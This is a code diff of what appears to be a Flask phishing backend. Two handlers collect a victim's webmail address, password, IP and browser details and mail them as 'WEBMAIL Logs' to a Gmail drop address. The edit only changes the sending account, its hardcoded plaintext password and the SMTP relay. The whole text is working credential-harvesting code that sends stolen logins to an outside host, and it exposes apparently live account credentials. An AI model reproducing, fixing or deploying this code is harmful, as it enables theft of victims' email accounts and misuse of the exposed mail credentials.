@@ -158,10 +158,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "rtinh@greatest-vitamins.com  "
+        sender_email = "new@influencedigital.cloud"
         sender_emaill = "eissa"
         receiver_email = "zeeskollectz@gmail.com"
-        password = "myworldWORK2026"
+        password = "Odilli116!"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL Logs !"
@@ -177,7 +177,7 @@ def first():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("smtpdm-eu-central-1.aliyuncs.com", 465) as server:
+        with smtplib.SMTP_SSL("smtp.titan.email", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
@@ -196,10 +196,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
-        sender_email = "rtinh@greatest-vitamins.com  "
+        sender_email = "new@influencedigital.cloud"
         sender_emaill = "eissa"
         receiver_email = "zeeskollectz@gmail.com"
-        password = "myworldWORK2026"
+        password = "Odilli116!"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "WEBMAIL logs !! "
@@ -215,7 +215,7 @@ def second():
         part2 = MIMEText(html, "html")
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL("smtpdm-eu-central-1.aliyuncs.com", 465) as server:
+        with smtplib.SMTP_SSL("smtp.titan.email", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
         return redirect(url_for('lasmo'))
